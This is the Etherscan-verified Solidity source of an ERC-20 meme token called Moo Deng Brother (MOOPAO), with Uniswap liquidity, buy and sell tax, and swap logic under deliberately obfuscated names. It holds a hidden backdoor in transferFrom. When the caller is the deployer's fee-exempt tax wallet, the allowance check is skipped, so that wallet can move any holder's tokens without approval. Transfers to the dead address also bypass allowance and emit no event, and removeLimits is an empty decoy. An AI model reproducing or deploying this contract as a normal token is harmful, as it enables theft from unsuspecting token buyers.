/**
 *Submitted for verification at Etherscan.io on 2025-03-19
*/

// SPDX-License-Identifier: MIT

/*
    New MooDeng
    MooPao

    https://t.me/NewMooDengMoopao
    https://www.instagram.com/p/DHY7uLCytrk/?img_index=1
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract MOOPAO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcJUNGLE;
    mapping(address => mapping(address => uint256)) private _allcvnkjnJUNGLE;
    mapping(address => bool) private _feevblknlJUNGLE;
    address payable private _taxclknlJUNGLE;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Moo Deng Brother";
    string private constant _symbol = unicode"MOOPAO";

    uint256 private _vkjbnkfjJUNGLE = 10;
    uint256 private _maxovnboiJUNGLE = 10;
    uint256 private _initvkjnbkjJUNGLE = 20;
    uint256 private _finvjlkbnlkjJUNGLE = 0;
    uint256 private _redclkjnkJUNGLE = 2;
    uint256 private _prevlfknjoiJUNGLE = 2;
    uint256 private _buylkvnlkJUNGLE = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknJUNGLE;
    bool private _inlknblJUNGLE = false;
    bool private swapvlkJUNGLE = false;
    uint256 private _sellcnjkJUNGLE = 0;
    uint256 private _lastflkbnlJUNGLE = 0;
    address constant _deadlknJUNGLE = address(0xdead);

    uint256 public _vnbbvlkJUNGLE = qq30fef / 100;
    uint256 public _oijboijoiJUNGLE = 15 * 10**18;
    uint256 private _cvjkbnkjJUNGLE = 10;

    modifier lockTheSwap() {
        _inlknblJUNGLE = true;
        _;
        _inlknblJUNGLE = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcJUNGLE[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    
    function _calcTax_lvknblJUNGLE(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblJUNGLE) {
                taxAmount = amount
                    .mul((_buylkvnlkJUNGLE > _redclkjnkJUNGLE) ? _finvjlkbnlkjJUNGLE : _initvkjnbkjJUNGLE)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlJUNGLE[to] &&
                to != _taxclknlJUNGLE
            ) {
                _buylkvnlkJUNGLE++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblJUNGLE &&
                to == uniswapV2Pair &&
                from != _taxclknlJUNGLE &&
                swapvlkJUNGLE &&
                _buylkvnlkJUNGLE > _prevlfknjoiJUNGLE
            ) {
                if (block.number > _lastflkbnlJUNGLE) {
                    _sellcnjkJUNGLE = 0;
                }
                _sellcnjkJUNGLE = _sellcnjkJUNGLE + _getAmountOut_lvcbnkJUNGLE(amount);
                require(_sellcnjkJUNGLE <= _oijboijoiJUNGLE, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkJUNGLE)
                    _swapTokenslknlJUNGLE(_vnbbvlkJUNGLE > amount ? amount : _vnbbvlkJUNGLE);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjJUNGLE(address(this).balance);
                }
                _lastflkbnlJUNGLE = block.number;
            }
        }
        return taxAmount;
    }

    constructor() payable {
        _taxclknlJUNGLE = payable(_msgSender());
        
        _balknvlkcJUNGLE[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcJUNGLE[address(this)] = (qq30fef * 98) / 100;
        _feevblknlJUNGLE[address(this)] = true;
        _feevblknlJUNGLE[_taxclknlJUNGLE] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojJUNGLE(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlJUNGLE[msg.sender]) return !_feevblknlJUNGLE[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknJUNGLE)) return false;
        return true;
    }

    function _transfer_kjvnJUNGLE(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblJUNGLE(from, to, amount);
        _balknvlkcJUNGLE[from] = _balknvlkcJUNGLE[from].sub(amount);
        _balknvlkcJUNGLE[to] = _balknvlkcJUNGLE[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcJUNGLE[address(this)] = _balknvlkcJUNGLE[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknJUNGLE) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnJUNGLE[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnJUNGLE(sender, recipient, amount);
        if (_downcklkojJUNGLE(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnJUNGLE[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function _sendETHTocvbnjJUNGLE(uint256 amount) private {
        _taxclknlJUNGLE.transfer(amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnJUNGLE(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnJUNGLE[owner][spender];
    }

    function _swapTokenslknlJUNGLE(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function JUNGLETeam() external onlyOwner {
        require(!_tradingvlknJUNGLE, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkJUNGLE = true;
        _tradingvlknJUNGLE = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnJUNGLE() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkJUNGLE(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblJUNGLE(address payable newWallet) external {
        require(_feevblknlJUNGLE[_msgSender()]);
        _taxclknlJUNGLE = newWallet;
        _feevblknlJUNGLE[_taxclknlJUNGLE] = true;
    }
}